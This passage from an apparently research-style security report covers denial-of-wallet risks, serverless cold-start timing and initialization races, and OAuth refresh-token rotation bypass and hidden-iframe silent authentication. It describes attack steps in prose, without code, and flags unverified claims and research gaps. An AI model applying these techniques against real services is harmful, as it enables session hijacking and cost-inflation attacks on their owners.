- Implement request validation to reject oversized or malformed payloads early.
- Monitor for unusual invocation patterns (rate, duration, error rates).

### Inferences
- DoW is a strategic attack that may be more damaging to startups and small organizations than to enterprises, because the financial threshold for significant impact is lower.
- Recursive trigger chains are the most dangerous DoW amplification vector because a single request can generate thousands of downstream invocations.

### Gaps
- No confirmed real-world DoW attack with published details (target, cost incurred, attacker methodology) was found.
- The arXiv review's simulation figures could not be independently verified.
- GCP and Azure-specific DoW techniques and billing model differences were not covered.

---

## Serverless Cold Start Exploitation

### Takeaway
Cold start exploitation in serverless environments is primarily discussed as a timing side-channel (distinguishing cold from warm invocations) and as a window during which initialization-time security controls may be incomplete. No published exploit chain specifically leveraging cold start timing for data theft or access bypass was found.

### Cited Findings
- A 2026 arXiv paper on serverless AI security describes cold-start exploitation as a timing-analysis attack, reporting cold-start latency of approximately 3.2 seconds versus 0.3 seconds for warm starts on AWS Lambda. The paper claims a 96.3% detection rate for cold-start exploitation, but the methodology behind this figure is not shown. -- [arXiv](https://arxiv.org/html/2601.11664v1)

**Theoretical Cold Start Attack Vectors:**
1. **Initialization race condition:** During cold start, the function container is initialized, dependencies are loaded, and connections are established. If security middleware (e.g., authentication checks, WAF rules) loads after the function handler becomes available, there is a window where requests are processed without full security controls.
2. **Timing side-channel:** An attacker can distinguish cold starts from warm invocations by measuring response latency. This reveals: (a) whether the function is actively in use, (b) the function's runtime and dependency size, and (c) potential scheduling information for time-sensitive attacks.
3. **Dependency confusion during init:** If the function downloads dependencies at cold start (e.g., Lambda layers from S3), an attacker who compromises the dependency source can inject malicious code that runs during initialization.

### Inferences
- Cold start exploitation is more of a reconnaissance and timing technique than a direct exploitation method.
- The most practical cold start concern is the initialization race condition, but this requires the function to have a vulnerable initialization sequence.

### Gaps
- No CVE or published exploit specifically targeting cold start timing was found.
- The arXiv paper's detection rate claims lack visible methodology and should be treated as unverified.

---

## Refresh Token Rotation Bypass and Silent Authentication Abuse

### Takeaway
Refresh token rotation bypass is a documented concern in OAuth security (RFC 9700 mandates replay detection), but specific exploitation techniques and CVEs are sparse. Silent authentication abuse (using `prompt=none` or hidden iframes to silently obtain tokens) is a known technique but lacks recent documented exploitation.

### Cited Findings
- RFC 9700 requires that public-client refresh tokens be sender-constrained or rotated with replay detection, revoking the active token when a previously used token is replayed. -- [RFC 9700](https://www.rfc-editor.org/info/rfc9700/)
- The NEBULA paper (2026) proposes extending rotation to revoke the entire rotation lineage upon replay detection, noting that the BCP does not require lineage-wide revocation. This means an attacker who captures a refresh token before it is rotated can use it once, causing the legitimate client's next rotation to fail, but the attacker's newly minted token remains valid until the server detects the anomaly. -- [arXiv NEBULA](https://arxiv.org/pdf/2608.04115)

**Refresh Token Rotation Bypass Techniques:**
1. **Race condition:** The attacker uses a stolen refresh token simultaneously with the legitimate client. If the server processes the attacker's request first, it issues a new token pair to the attacker and the legitimate client's token becomes invalid. The attacker now has a valid session.
2. **Replay before rotation:** The attacker intercepts a refresh token and uses it before the legitimate client's next refresh. The server issues new tokens to the attacker, and the old token (which the legitimate client holds) is now invalid.
3. **Grace period exploitation:** Some implementations allow a brief window where both old and new refresh tokens are valid (to handle network retries). The attacker can use the old token during this grace period.

**Silent Authentication Flow:**
1. The attacker (or a malicious client-side script) creates a hidden iframe pointing to the authorization server with `prompt=none&response_mode=fragment`.
2. If the user has an active session with the authorization server, it silently issues a new authorization code or token without user interaction.
3. The attacker extracts the token from the iframe's fragment identifier.
4. This is primarily used for session persistence and can be chained with XSS on the client application.

### Inferences
- The race condition in refresh token rotation is a real but narrow attack window. Implementations that use single-use rotation with immediate invalidation are vulnerable to denial-of-service against the legitimate user (their token is invalidated) even if the attacker cannot maintain access.
- Silent authentication is mitigated by third-party cookie blocking in modern browsers, which prevents the hidden iframe from carrying the user's session cookie to the authorization server.

### Gaps
- No specific CVE for refresh token rotation bypass was found.
- Whether any major IdP (Auth0, Okta, Entra ID) has been publicly exploited via silent authentication abuse was not found in search results.
- Token binding (RFC 8471) attack research was not found in any source.
